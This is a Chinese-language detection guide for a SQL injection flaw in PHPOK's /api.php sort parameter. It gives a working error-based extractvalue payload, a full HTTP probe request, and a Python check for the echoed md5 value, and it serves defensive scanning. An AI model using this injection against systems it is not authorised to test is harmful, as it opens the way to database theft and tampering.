# PHPOK SQL注入漏洞（phpok-sqli）检测说明

## 漏洞简介

PHPOK 存在SQL注入漏洞，攻击者可通过GET请求注入恶意SQL语句，进而获取数据库敏感信息、篡改数据，甚至以管理员权限执行未授权操作。

## 影响范围

- 产品：PHPOK
- CVE编号：无（社区编号 phpok-sqli）
- 危害等级：Critical

## 漏洞原理

/api.php接口的参数未做有效过滤，攻击者可通过sort参数注入SQL语句，利用extractvalue函数触发报错并回显特征数据。

## 利用方式与攻击流程

1. 攻击者构造带有SQL注入payload的GET请求，sort参数注入`1 and extractvalue(1,concat(0x7e,md5(999999999))) --+`。
2. 服务器端未对参数进行安全处理，直接拼接执行SQL。
3. 数据库执行恶意SQL，返回包含md5(999999999)的特征数据。
4. 攻击者分析响应内容，确认漏洞存在。

## 探测原理与流程

### 探测请求的构造

```http
GET /api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5(999999999))) --+ HTTP/1.1
Host: target.com
```

- sort参数注入了`1 and extractvalue(1,concat(0x7e,md5(999999999))) --+`，用于判断是否存在注入点。

### 预期响应与交互

- 响应体需包含`{{md5(999999999)}}`（即`ef775988943825d2871e1cfa75473ec0`），表明SQL语句被执行。

### 判定逻辑

```python
def is_vulnerable(response):
    if 'ef775988943825d2871e1cfa75473ec0' in response.text:
        return True
    return False
```

### 检测流程Mermaid图

```mermaid
graph TD
    A[发送带注入payload的GET请求] --> B[接收HTTP响应]
    B --> C{响应体含md5(999999999)?}
    C -- 否 --> F[非漏洞]
    C -- 是 --> G[判定存在SQL注入漏洞]
```

## 参考链接

- [CVE Report - PHPOK](https://cve.report/software/phpok/phpok) 